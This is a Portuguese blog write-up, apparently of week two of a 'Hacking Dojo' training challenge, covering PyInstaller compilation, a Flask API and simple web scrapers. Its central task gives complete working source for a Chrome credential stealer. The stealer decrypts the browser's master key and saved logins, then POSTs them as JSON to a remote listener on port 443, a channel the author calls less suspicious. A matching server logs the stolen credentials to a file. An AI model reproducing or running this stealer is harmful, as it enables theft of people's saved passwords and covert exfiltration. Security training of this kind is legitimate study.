@@ -1,0 +1,291 @@
+<p>Dando continuidade no desafio do <a href="https://becodoexploit.com/HackingDojo/">Hacking Dojo</a>, hoje atacaremos a semana 02.</p>
+
+<p>Basicamente nesta semana, vamos melhorar os scripts feitos na semana anterior a aprendermos um pouco mais sobre criaçâo de ferramentas em <code class="language-plaintext highlighter-rouge">Python</code>.</p>
+
+<p>Sem mais delongas, vamos ao desafio.</p>
+
+<h2 id="tasks-x09-e-x0a">Tasks \x09 e \x0a</h2>
+
+<center><img src="/img/std/dojo/dojo-18.png" /></center>
+
+<p>Nesta etapa, nâo será necessária nenhuma alteração no script já feito, pois ele já atende as especificações solicitadas, porém, é preciso compilá-lo em um <code class="language-plaintext highlighter-rouge">executável</code> do Windows.</p>
+
+<p>A vantagem de compilar um script em um executável, é de que ele “encapsula” as bibliotecas, fazendo com que o executável rode em máquinas, mesmo que elas <code class="language-plaintext highlighter-rouge">nâo tenham</code> Python instalado.</p>
+
+<p>Existem alguns módulos do Python que fazem esta compilaçâo, eu escolhi o <code class="language-plaintext highlighter-rouge">Pyinstaller</code> por ser mais intuitivo. Sua documentação pode ser encontrada <a href="https://www.pyinstaller.org/">aqui</a>.</p>
+
+<p>O Pyinstaller é OS based, ou seja, se eu compilar um script no Linux, ele cria um <code class="language-plaintext highlighter-rouge">ELF</code>, se eu compilar no Windows, ele gera um <code class="language-plaintext highlighter-rouge">.EXE</code>, para atender os requisitos das tasks, vamos compilar na <code class="language-plaintext highlighter-rouge">Commando VM</code> que estamos utilizando.</p>
+
+<p>A forma mais simples de criar um executável com o Pyinstaller é com o comando <code class="language-plaintext highlighter-rouge">pyinstaller -F &lt;script&gt;</code>. Onde o <code class="language-plaintext highlighter-rouge">-F</code> informa para o executável ser gerado em um único arquivo.</p>
+
+<center><img src="/img/std/dojo/dojo-19.png" /></center>
+
+<p>Após a compilação, o Pyinstaller criará três diretórios: <code class="language-plaintext highlighter-rouge">__pycache__</code>, <code class="language-plaintext highlighter-rouge">dist</code> e <code class="language-plaintext highlighter-rouge">build</code>, o executável estará no diretório <code class="language-plaintext highlighter-rouge">dist</code>.</p>
+
+<center><img src="/img/std/dojo/dojo-20.png" /></center>
+
+<p>Para testé-lo, vamos iniciar no script handler e executar o programa na VM Windows.</p>
+
+<center><img src="/img/std/dojo/dojo-21.png" /></center>
+
+<p>Conforme esperado, o executável se conectou com nosso server, e enviou as credenciais tratadas, da mesma forma que o próprio script faz.</p>
+
+<p>Isso finaliza as duas primeiras tasks da semana 02.</p>
+
+<h2 id="tasks-x0b-e-x0c">Tasks \x0b e \x0c</h2>
+
+<center><img src="/img/std/dojo/dojo-22.png" /></center>
+
+<p>Nestas tasks, vamos explorar outro universo dentro do Python, pois precisamos criar uma <code class="language-plaintext highlighter-rouge">API</code>que receberá uma requisição <code class="language-plaintext highlighter-rouge">POST</code>. Como framework para este script, escolhi o <code class="language-plaintext highlighter-rouge">Flask</code>, por já ter certo grau de conhecimento com a biblioteca.</p>
+
+<p>O Flask nos permite criar uma API de forma muito simpes e fácil, o script ficou desta forma:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="c1"># importando as bibliotecas
+</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="c1"># funcao que gravará o arquivo de log
+</span><span class="k">def</span> <span class="nf">log</span><span class="p">(</span><span class="nb">buffer</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"creds.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">log</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">buffer</span><span class="p">:</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="c1"># define a rota para receber a requisicao
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">add_dados</span><span class="p">():</span>
+    <span class="n">recv</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get_json</span><span class="p">()</span>
+    <span class="k">if</span> <span class="s">"Dojo"</span> <span class="ow">in</span> <span class="n">recv</span><span class="p">:</span>
+        <span class="n">log</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">recv</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">,</span> <span class="mi">202</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">)</span>
+
+</code></pre></div></div>
+<p>Como não informei uma porta para o servidor da API funcionar, ela utilizará a padrão <code class="language-plaintext highlighter-rouge">5000</code>. Ao executar o script, o servidor da API ficará ativo.</p>
+
+<center><img src="/img/std/dojo/dojo-23.png" /></center>
+
+<p>O próximo passo é criar um client para esta API que enviará a string <code class="language-plaintext highlighter-rouge">Hacking Dojo</code>, como a tarefe é bem simples, somente a bibliotecar <code class="language-plaintext highlighter-rouge">requests</code> e <code class="language-plaintext highlighter-rouge">json</code> dão conta do solicitado.</p>
+
+<p>O script fica desta forma:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"http://192.168.1.7:5000/"</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"content-type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
+<span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">({</span><span class="s">"mensagem"</span><span class="p">:</span> <span class="s">"Hacking Dojo"</span><span class="p">})</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+</code></pre></div></div>
+<p>A execução na máquina Windos também é rápida e sem resposta aparente, já no Kali, podemos visualizar que um <code class="language-plaintext highlighter-rouge">POST</code> foi feito:</p>
+
+<center><img src="/img/std/dojo/dojo-24.png" /></center>
+
+<p>E um arquivo de log foi criado com a string “Hacking Dojo”</p>
+
+<center><img src="/img/std/dojo/dojo-25.png" /></center>
+
+<p>Isto finaliza as tasks 11 e 12.</p>
+
+<h2 id="task-x0d">Task \x0d</h2>
+
+<p>Esta task deixa as coisas muito mais interessantes, pois vamos utilizar todo o exploit feito para salvar as credenciais do <code class="language-plaintext highlighter-rouge">Chrome</code> via socket, e fazer com que o envio seja feito via <code class="language-plaintext highlighter-rouge">POST</code>.</p>
+
+<p>Sem contar que uma requisição POST vinda do client, é muito menos “suspeita” do que uma requisição via socket.</p>
+
+<p>O script do lado server, não muda em quase nada, tirando que agora coloquei a API para rodar na porta 443:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="c1"># importando as bibliotecas
+</span><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">jsonify</span><span class="p">,</span> <span class="n">request</span><span class="p">,</span> <span class="n">render_template</span>
+<span class="kn">import</span> <span class="nn">json</span>
+
+<span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="n">__name__</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">log</span><span class="p">(</span><span class="nb">buffer</span><span class="p">):</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"creds.txt"</span><span class="p">,</span> <span class="s">"w"</span><span class="p">)</span> <span class="k">as</span> <span class="n">log</span><span class="p">:</span>
+        <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">buffer</span><span class="p">:</span>
+            <span class="n">log</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+<span class="c1"># definindo a rota para o POST
+</span><span class="o">@</span><span class="n">app</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'POST'</span><span class="p">])</span>
+<span class="k">def</span> <span class="nf">add_dados</span><span class="p">():</span>
+    <span class="n">recv</span> <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">get_json</span><span class="p">()</span>
+    <span class="n">log</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">recv</span><span class="p">,</span> <span class="n">sort_keys</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
+    <span class="k">return</span> <span class="s">''</span><span class="p">,</span> <span class="mi">202</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">app</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s">"0.0.0.0"</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">443</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Já o script do client, vai permanecer com a mesma mecĉanica para o dump e tratamento dos dados das credenciais, porém, alteramos o metodo de socket para request:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">json</span>
+<span class="kn">import</span> <span class="nn">base64</span>
+<span class="kn">import</span> <span class="nn">sqlite3</span>
+<span class="kn">import</span> <span class="nn">win32crypt</span>
+<span class="kn">from</span> <span class="nn">Cryptodome.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
+<span class="kn">import</span> <span class="nn">shutil</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">host</span> <span class="o">=</span> <span class="sa">r</span><span class="s">"http://192.168.1.7:443/"</span>
+<span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"content-type"</span><span class="p">:</span> <span class="s">"application/json"</span><span class="p">}</span>
+
+<span class="c1">#diretorio dos arquivos Chrome
+</span><span class="n">path</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">path</span><span class="p">.</span><span class="n">expanduser</span><span class="p">(</span><span class="s">'~'</span><span class="p">)</span> <span class="o">+</span> <span class="sa">r</span><span class="s">"\AppData\Local\Google\Chrome\User Data\\"</span>
+
+<span class="c1"># Capturar e decriptar a master key
+</span><span class="k">def</span> <span class="nf">master</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span> <span class="o">+</span> <span class="sa">r</span><span class="s">"Local State"</span><span class="p">,</span> <span class="s">'r'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">local_state</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">read</span><span class="p">()</span>
+        <span class="n">local_state</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">local_state</span><span class="p">)</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">local_state</span><span class="p">[</span><span class="s">"os_crypt"</span><span class="p">][</span><span class="s">"encrypted_key"</span><span class="p">])</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">key</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="p">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="bp">None</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
+    <span class="k">return</span> <span class="n">key</span>
+
+<span class="c1"># gera cifra
+</span><span class="k">def</span> <span class="nf">gera_cifra</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">pw</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">AES</span><span class="p">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="p">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">pw</span><span class="p">)</span>
+
+<span class="c1"># desencripta o password com a cifra
+</span><span class="k">def</span> <span class="nf">decrypt_payload</span><span class="p">(</span><span class="n">cifra</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
+    <span class="k">return</span> <span class="n">cifra</span><span class="p">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="c1"># desencripta o password
+</span><span class="k">def</span> <span class="nf">decrypt_pwd</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">key</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">pw</span> <span class="o">=</span> <span class="n">password</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span>
+        <span class="n">payload</span> <span class="o">=</span> <span class="n">password</span><span class="p">[</span><span class="mi">15</span><span class="p">:]</span>
+        <span class="n">cifra</span> <span class="o">=</span> <span class="n">gera_cifra</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">pw</span><span class="p">)</span>
+        <span class="n">pass_decrypt</span> <span class="o">=</span> <span class="n">decrypt_payload</span><span class="p">(</span><span class="n">cifra</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
+        <span class="n">pass_decrypt</span> <span class="o">=</span> <span class="n">pass_decrypt</span><span class="p">[:</span><span class="o">-</span><span class="mi">16</span><span class="p">].</span><span class="n">decode</span><span class="p">()</span>
+        <span class="k">return</span> <span class="n">pass_decrypt</span>
+    <span class="k">except</span><span class="p">:</span>
+        <span class="k">return</span> <span class="s">"Chrome &lt; 80"</span>
+
+
+<span class="n">key</span> <span class="o">=</span> <span class="n">master</span><span class="p">()</span>
+<span class="n">db</span> <span class="o">=</span> <span class="n">path</span> <span class="o">+</span> <span class="sa">r</span><span class="s">"Default\Login Data"</span>
+<span class="c1"># cria uma copia do db, caso o Chrome esteja aberto
+</span><span class="n">shutil</span><span class="p">.</span><span class="n">copy2</span><span class="p">(</span><span class="n">db</span><span class="p">,</span> <span class="s">"database.db"</span><span class="p">)</span>
+<span class="n">connect</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="p">.</span><span class="n">connect</span><span class="p">(</span><span class="s">"database.db"</span><span class="p">)</span>
+<span class="n">cursor</span> <span class="o">=</span> <span class="n">connect</span><span class="p">.</span><span class="n">cursor</span><span class="p">()</span>
+
+<span class="c1">#array que guardara as credenciais
+</span><span class="n">dados</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="k">try</span><span class="p">:</span>
+    <span class="n">cursor</span><span class="p">.</span><span class="n">execute</span><span class="p">(</span><span class="s">"select action_url, username_value, password_value from logins"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">cursor</span><span class="p">.</span><span class="n">fetchall</span><span class="p">():</span>
+        <span class="n">url</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">user</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">i</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+        <span class="n">password</span> <span class="o">=</span> <span class="n">decrypt_pwd</span><span class="p">(</span><span class="n">password</span><span class="p">,</span> <span class="n">key</span><span class="p">)</span>
+        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">user</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+            <span class="n">dump</span> <span class="o">=</span> <span class="p">{</span><span class="s">"URL"</span><span class="p">:</span> <span class="n">url</span><span class="p">,</span> <span class="s">"User"</span><span class="p">:</span> <span class="n">user</span><span class="p">,</span> <span class="s">"Password"</span><span class="p">:</span> <span class="n">password</span><span class="p">}</span>
+            <span class="n">dados</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">dump</span><span class="p">)</span>
+    <span class="n">dados</span> <span class="o">=</span> <span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">dados</span><span class="p">)</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">host</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">dados</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span>
+    
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="k">pass</span>
+
+<span class="n">cursor</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+<span class="n">connect</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
+
+<span class="c1"># remove a copia do db
+</span><span class="k">try</span><span class="p">:</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">remove</span><span class="p">(</span><span class="s">"database.db"</span><span class="p">)</span>
+<span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+    <span class="k">pass</span>
+</code></pre></div></div>
+<p>Ao executar o script do client no Windows, a conclusão é muito rápida e sem uma resposta aparente, já no Kali, vemos uma requisição POST feita, e o arquivo <code class="language-plaintext highlighter-rouge">creds.txt</code> foi gravado com todas as credenciais no formato <code class="language-plaintext highlighter-rouge">JSON</code>.</p>
+
+<center><img src="/img/std/dojo/dojo-26.png" /></center>
+
+<p>Isto finaliza a task 13.</p>
+
+<h2 id="task-x0e">Task \x0e</h2>
+
+<center><img src="/img/std/dojo/dojo-27.png" /></center>
+
+<p>Esta task voi divertida, pois como tenho um background de Data Science e rotineiramente precisamos fazer um <code class="language-plaintext highlighter-rouge">Scrapping</code> em páginas web, foi legal utilizar esse conhecimento no Dojo.</p>
+
+<p>O script basicamente faz uma requisição na página alvo, utiliza um pouco de <a href="https://regexr.com/">regex</a> para tratar os dados, e em seguida faz a contagem de <code class="language-plaintext highlighter-rouge">batatas</code>na página.</p>
+
+<p>Nosso <code class="language-plaintext highlighter-rouge">batata counter</code> ficou desta forma:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://en.wikipedia.org/wiki/Batata"</span>
+
+<span class="c1"># funcao que limpa os dados da pagina requisitada
+</span><span class="k">def</span> <span class="nf">limpeza</span><span class="p">(</span><span class="n">texto</span><span class="p">):</span>
+    <span class="n">texto</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">texto</span><span class="p">)</span>
+    <span class="n">excluso</span> <span class="o">=</span> <span class="p">[</span><span class="sa">r</span><span class="s">'\n'</span><span class="p">,</span> <span class="sa">r</span><span class="s">'.'</span><span class="p">,</span> <span class="sa">r</span><span class="s">'?'</span><span class="p">,</span> <span class="sa">r</span><span class="s">'!'</span><span class="p">,</span> <span class="sa">r</span><span class="s">'('</span><span class="p">,</span> <span class="sa">r</span><span class="s">')'</span><span class="p">]</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">excluso</span><span class="p">:</span>
+        <span class="n">texto</span><span class="p">.</span><span class="n">replace</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">""</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">texto</span>
+
+<span class="c1"># contador de batatas
+</span><span class="k">def</span> <span class="nf">contar_batata</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="s">"html.parser"</span><span class="p">)</span>
+    <span class="n">batatas</span> <span class="o">=</span> <span class="n">limpeza</span><span class="p">(</span><span class="n">s</span><span class="p">.</span><span class="n">text</span><span class="p">.</span><span class="n">lower</span><span class="p">())</span>
+    <span class="n">batatas</span> <span class="o">=</span> <span class="n">batatas</span><span class="p">.</span><span class="n">split</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">batatas</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="s">"batata"</span><span class="p">)</span>
+
+<span class="n">contagem</span> <span class="o">=</span> <span class="n">contar_batata</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">'''
+O numero de batatas na pagina e </span><span class="si">{</span><span class="n">contagem</span><span class="si">}</span><span class="s">
+'''</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Apos a execução, o script retorna quantas batatas foram encontradas na página:</p>
+
+<center><img src="/img/std/dojo/dojo-28.png" /></center>
+
+<p>Isto finaliza a task 14 desta semana.</p>
+
+<h2 id="task-x0f">Task \x0f</h2>
+
+<center><img src="/img/std/dojo/dojo-29.png" /></center>
+
+<p>Desta vez ainda vamos fazer o <code class="language-plaintext highlighter-rouge">Scrapping</code> da página, porém, vamos retornar todos os links encontrados. Este tipo de ferramenta pode ser muito útil para enumeração.</p>
+
+<p>Já existem muitas ferramentas que são muito boas nisso, mas saber a mecânica por trás de tudo é essencial.</p>
+
+<p>O script não fica muito diferente do anterior, porém vamos filtrar as strings pelas tags HTML <code class="language-plaintext highlighter-rouge">a</code> e <code class="language-plaintext highlighter-rouge">href</code>:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"https://en.wikipedia.org/wiki/Batata"</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">content</span><span class="p">,</span> <span class="s">"html.parser"</span><span class="p">)</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">.</span><span class="n">find_all</span><span class="p">(</span><span class="s">"a"</span><span class="p">):</span>
+    <span class="k">print</span><span class="p">(</span><span class="n">i</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"href"</span><span class="p">))</span>
+</code></pre></div></div>
+
+<p>Ao executar o script, temos todos os links da página.</p>
+
+<center><img src="/img/std/dojo/dojo-30.png" /></center>
+
+<p>Desta forma finalizamos as tasks da semana 02, em breve continuaremos na trilha.</p>
+
+<p>Bons estudos!</p>
